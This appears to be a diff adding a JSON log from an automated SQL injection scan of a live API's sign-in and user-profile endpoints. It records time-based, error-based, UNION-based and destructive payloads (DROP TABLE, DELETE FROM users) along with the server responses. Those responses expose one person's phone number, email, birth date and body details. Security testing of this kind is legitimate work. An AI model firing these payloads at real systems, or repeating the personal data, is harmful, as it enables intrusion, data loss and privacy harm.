+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:20 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AZ4KifBWh4NyfqD7_emVh5LUvTw5JEQCk.sUCC%2F7agK3LnYG5S6pN0vgDRYRZkavvZ5T%2FLZQLYHOE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "time_based_postgresql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453'; SELECT pg_sleep(5)--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12354636192321777,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AhGa09fKmQxIM1Z02fOuB8hC9mPdgJpD0.S%2BoZuZq6%2BjfcWw82Gdq%2B2cUQeqiYZ907EgJbjBU0Aew; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "time_based_postgresql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453' AND (SELECT 1 FROM pg_sleep(5))--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.3144986629486084,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3A_T87LoMDkSSfDSMgBywQkt3NLkCZMMDk.36DUCXfdwCJCO5IQI0or5tgYN4Oeeo2Got5azD5GCVk; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "time_based_postgresql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12574386596679688,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AI0WxUyT0iGAp0xCVKsyMt5g-2u_BvIXN.w50HddQJlp3XWqz%2BRYKDppUSNmbsEzZk9vNtN2NEpRk; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "time_based_mysql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453' AND SLEEP(5)--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12746214866638184,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3A1q4canU7LMiEZcdJAJi6wwCdwYh4yi7S.oAxcREQcyNip%2Bq4cY%2FYXGFj%2FyXYyQHjGad4aZVGFJuU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "time_based_mysql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453' OR SLEEP(5)--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.138655424118042,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AB_1HWoIZoH7U1MY7FDKAq3gprBOTBHqN.NNna%2FHu%2BKIcJofDfhUbKcvugVOb1U4sWJ8zfCnSXiUE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/completeSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453",
+        "challengeCode": "' OR '1'='1"
+      },
+      "status_code": 400,
+      "response_length": 249,
+      "elapsed_time": 0.11998319625854492,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/completeSignIn`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "250",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+        "set-cookie": "sails.sid=s%3AWK2Ne9XmlUyD3Rg1GvK6CyNhPMVkY0ml.%2FlwnvL0UT%2FVKkohMkpmcbTYKR2VdR%2B2GkUum7AlirbE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/completeSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453",
+        "challengeCode": "' OR 1=1--"
+      },
+      "status_code": 400,
+      "response_length": 249,
+      "elapsed_time": 0.1237332820892334,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/completeSignIn`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "250",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:21 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+        "set-cookie": "sails.sid=s%3AT9zL-BD4lZ_WAmiX6ySH64dwhOx0r1Lt.t4YKpTeLcx7oUTiBr%2BsYiThNiUTGk%2F9ZCxObTUWEH7o; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/completeSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453",
+        "challengeCode": "' OR 'x'='x"
+      },
+      "status_code": 400,
+      "response_length": 249,
+      "elapsed_time": 0.12378764152526855,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/completeSignIn`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "250",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:22 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+        "set-cookie": "sails.sid=s%3Au-yTvsSjuPBKKVNW4T1WvmdbT0NFbous.%2FRYOXoD0zCHV%2Fb29aYzJjR%2FbuEoP45JR8UzwlYEYl%2FA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "error_based",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' AND 1=CAST((SELECT version()) AS int)--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12242364883422852,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:22 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3A2NlgBUPmxUdAbYXE9nHg6rvBi7F_PFHS.naKbzc8lV7cJJJ4rriORPExbDyUMZqOpJIkOdv96vhI; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "error_based",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' AND 1::int=version()::text--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.2518012523651123,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:22 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3ApuUOq45LGeUSALjDGlRXT45hMftkN9io.NzBBNOmRnVNxE0MR%2BzUhDasjkuj3qZ1vVfyChhnBanM; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "error_based",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' AND 1=CONVERT(int, @@version)--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.1211690902709961,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:22 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3Aah0y3ZpJBpt0pSuUO3Jdf7MegzP81-4R.SEuQ%2FCeoCYRdKHu7Qf2U1cc4sJ6xbH0ISHhYF4xY6fg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "error_based",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' AND extractvalue(1, concat(0x7e, version()))--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12232661247253418,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:22 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AZomzSvbEHMprzLbuviTlLdP6mYgTetgn.ebHWQsRCdDZr4g3nu4oKvgl7ah2FFdIuWYW7DrAY8HY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_firstName",
+      "params": null,
+      "json_data": {
+        "firstName": "' OR '1'='1"
+      },
+      "status_code": 200,
+      "response_length": 2020,
+      "elapsed_time": 0.49286651611328125,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903033,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' OR '1'='1\",\"middleName\":\"\",\"lastName\":\"Chopra\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymentDetails\":false,\"str",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7e4-UX9GxF1jxjdyBeiPOwz9tkTvja0\"",
+        "set-cookie": "sails.sid=s%3ALfH-dJjwEJwM92eOWZ1imkp7CtChwlck.AG1NTunsnceIB4pNufsmCHf%2BZIO%2BN3XEjNZ%2FZ6CWIUs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_firstName",
+      "params": null,
+      "json_data": {
+        "firstName": "'; DROP TABLE users--"
+      },
+      "status_code": 200,
+      "response_length": 2030,
+      "elapsed_time": 0.3540329933166504,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903351,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"Chopra\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymentDetails\":",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7ee-5W9YNmd0tCpszL6ra5CaVnpjDjg\"",
+        "set-cookie": "sails.sid=s%3AbAgRswHsS_KzYdG98mLMr0QM9lnPEG7d.RAxu5VYT5yszIqmBlxGzut63iGT5IpQxxY7WZia4o0g; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_firstName",
+      "params": null,
+      "json_data": {
+        "firstName": "' UNION SELECT * FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2038,
+      "elapsed_time": 0.36286234855651855,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903701,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"Chopra\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymentD",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f6-YQBecrlj8izSuFWb9gnl9tmmp9U\"",
+        "set-cookie": "sails.sid=s%3AH-R3FjXBz_hJNYgXn-J-nS2JjHTrNPrf.hyCACZU6QXVqdifWwPPXlRqoUvlmaOh678XeMecIjtA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "admin'--"
+      },
+      "status_code": 200,
+      "response_length": 2040,
+      "elapsed_time": 0.4027256965637207,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904066,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"admin'--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymen",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:24 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f8-3lBMqXbhb1yPcpGnkc/rZKbH/iQ\"",
+        "set-cookie": "sails.sid=s%3AuIMfawlm8QPRXOX13GW_8osSzLIClvDw.BYbmupbz7fS3WT%2BP2hl3bvOhgOM2a3hcMeNAPnpFmvc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "' OR 1=1#"
+      },
+      "status_code": 200,
+      "response_length": 2041,
+      "elapsed_time": 0.3309061527252197,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904472,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"' OR 1=1#\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePayme",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:24 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f9-gEdBPrrgmmWYwessJkZ3C8U23CU\"",
+        "set-cookie": "sails.sid=s%3ABDfB5OXB-DQPFttkf1vDg58VmIt2ldwb.oW90Tg2cVxhypGHeVxcu2s8uoBSPzGfkKaHZ1a8mSn0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "'; INSERT INTO users VALUES('hacked')--"
+      },
+      "status_code": 200,
+      "response_length": 2071,
+      "elapsed_time": 0.33812713623046875,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904811,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaA",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:25 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"817-z/+gphpN5uJ4ioldGbQ+2bCuZRA\"",
+        "set-cookie": "sails.sid=s%3A29PtNwg78Wv-XZSic5AnihL4rWmWWdoX.PGVVvMWMhsogJMXQnQxXdZ0rSAXXETYzFac1MnoPSGw; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_email",
+      "params": null,
+      "json_data": {
+        "email": "test@test.com' OR '1'='1"
+      },
+      "status_code": 200,
+      "response_length": 2075,
+      "elapsed_time": 0.6497800350189209,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364905450,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"test@test.com' OR '1'='1\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isE",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:25 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"81b-HHgcnp4nvRo4WA227WOnQVSMxxw\"",
+        "set-cookie": "sails.sid=s%3A-B0hKLs3BLYUfTF8v9-uHUBRJrMBs3hm.KTZVzWy1CmIl4Y4MXKWxv8oUHPraffWzKvyYzK2Z4Qc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_email",
+      "params": null,
+      "json_data": {
+        "email": "' UNION SELECT password FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.6241061687469482,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906097,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:26 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-Ghoc3ww7YaQXRH1A7gZLlKA/4Zo\"",
+        "set-cookie": "sails.sid=s%3AGbIPTsuZv2WBxtV81WI749dGpwGH2y9U.3aWn55dsGqOfnOkGRHrG27wI7Gwtbb5J01D02OI8HUI; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_phoneNumber",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+1' OR 1=1--"
+      },
+      "status_code": 500,
+      "response_length": 21,
+      "elapsed_time": 0.13183808326721191,
+      "response_snippet": "Internal Server Error",
+      "headers": {
+        "content-length": "21",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:26 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+        "set-cookie": "sails.sid=s%3A50xwH6DiWVSl_JyLJbrSIIDp_K8RMEA0.UtRkqqK%2FlAvcEjaj0cFoxF5cA2tbcrr%2BdapkVaAw2ow; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "serverError"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_phoneNumber",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453'; DROP TABLE--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.5997672080993652,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-dcnFcazRxTs4bV2+ZGB3scrCcUo\"",
+        "set-cookie": "sails.sid=s%3AFO_p1VsylIWwyxNtq1Wr47HWrzqDOGg0.1dIr4eJaVFcg%2BA5rIUJS2XJKDrFfaVQwza%2Buu%2Bs1Edg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_weight",
+      "params": null,
+      "json_data": {
+        "weight": "100' OR '1'='1"
+      },
+      "status_code": 500,
+      "response_length": 21,
+      "elapsed_time": 0.14528512954711914,
+      "response_snippet": "Internal Server Error",
+      "headers": {
+        "content-length": "21",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+        "set-cookie": "sails.sid=s%3AuU1ryhRfLhGIG4CLsmIJZCChniuSCxj8.706E7zZXvmRF9BkPR3%2BPDDP%2Bn0HYkq%2BOvBzYZqbe%2F%2Bo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "serverError"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_weight",
+      "params": null,
+      "json_data": {
+        "weight": "150'; DELETE FROM users--"
+      },
+      "status_code": 500,
+      "response_length": 21,
+      "elapsed_time": 0.13103318214416504,
+      "response_snippet": "Internal Server Error",
+      "headers": {
+        "content-length": "21",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+        "set-cookie": "sails.sid=s%3AMlGANLhvSjf6W8_EuEJyqWru-sXerH_z.I5nT6HBwD6PHLf5hiO49keQIk%2Bi1ZxzuVo5nQgzzIfQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "serverError"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17177748680114746,
